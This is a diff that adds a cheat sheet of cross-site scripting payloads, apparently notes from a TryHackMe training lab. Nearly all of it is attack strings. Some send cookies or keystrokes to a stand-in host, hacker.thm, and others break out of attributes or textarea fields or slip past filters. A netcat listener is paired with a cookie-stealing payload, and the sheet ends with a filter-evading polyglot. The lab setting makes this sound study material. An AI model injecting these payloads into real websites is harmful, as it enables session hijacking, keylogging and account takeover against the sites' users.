@@ -1,0 +1,39 @@
+XSS (Cross-Site Scripting) Attack
+
+Payloads:-
+
+1. PoC XSS:
+<script>alert('XSS');</script>
+
+2.Session Stealing:
+<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
+
+3.Key Logger:
+<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
+
+4.Business Logic:
+<script>user.changeEmail('attacker@hacker.thm');</script>
+
+Payload According to level of XSS
+
+1. <script>alert("msg")</script>
+2. "><script>alert('THM');</script>
+3. </textarea><script>alert('THM');</script> (used for textarea field)
+4. ';alert('THM');//
+5. <sscriptcript>alert("msg")</sscriptcript> (To bypass Firewall)
+6. /images/cat.jpg" onload="alert('THM'); Where image is loaded
+
+
+-------------------------------------
+Making connect via netcat and creating reverse connection to get cookie
+
+nc -nlvp 9001
+
+</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>
+
+-------------------------------------
+Polyglots:
+
+An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.
+
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
